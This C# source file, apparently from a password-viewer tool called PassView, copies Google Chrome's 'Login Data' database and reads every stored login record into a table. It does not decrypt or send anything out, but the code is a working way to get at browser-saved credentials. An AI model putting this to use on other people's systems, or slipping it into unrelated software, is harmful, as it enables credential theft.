using System;
using System.Data;
using System.Data.SQLite;
using System.IO;

namespace PassView
{
    public class Chrome
    {
        private static string CopySourceFile() {
            string LoginDataSource = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                + "/Google/Chrome/User Data/Default";///Login Data"; // a path to the file
            string LoginDataDestination = "";
            if (Directory.Exists(LoginDataSource))
            {
                string[] files = Directory.GetFiles(LoginDataSource);

                // Copy the files and overwrite destination files if they already exist.
                foreach (string s in files)
                {
                    // Use static Path methods to extract only the file name from the path.
                    string fileName = Path.GetFileName(s);
                    if(fileName == "Login Data")
                    {
                        LoginDataDestination = fileName;
                        File.Copy(s, LoginDataDestination, true);
                    }
                    
                }
                return LoginDataDestination;
            }
            else
            {
                Console.WriteLine("Source path does not exist!");
            }
            return null;
        }

        public static DataTable GetPassData(bool keepEncpFile = false) {
            string LoginData = CopySourceFile();
            string db_field = "logins";   // DB table field name

            string ConnectionString = "data source=" + LoginData + ";New=True;UseUTF16Encoding=True";
            DataTable DB = new DataTable();
            string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
            using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
            {
                SQLiteCommand command = new SQLiteCommand(sql, connect);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                adapter.Fill(DB);
            }
            if (!keepEncpFile)
                File.Delete(LoginData);
            return DB;
        }
    }
}
